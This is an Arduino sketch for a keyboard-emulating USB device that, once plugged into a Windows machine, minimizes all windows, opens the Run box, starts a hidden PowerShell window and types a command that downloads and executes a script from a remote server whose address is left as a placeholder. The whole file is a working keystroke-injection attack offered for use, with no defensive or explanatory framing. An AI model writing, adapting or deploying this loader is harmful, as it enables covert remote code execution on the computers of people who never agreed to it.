#include <Keyboard.h> 


void setup()
{

  Keyboard.begin();

  delay(500);

  delay(1000);

  // Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(100);
  Keyboard.releaseAll();

  delay(500);

  // Open run box
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("powershell -WindowStyle Hidden");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("$scriptUrl = 'http://{{your-remote-server-ip}}:5000/uploads/run.ps1'; Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl)");

  typeKey(KEY_RETURN);

}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}
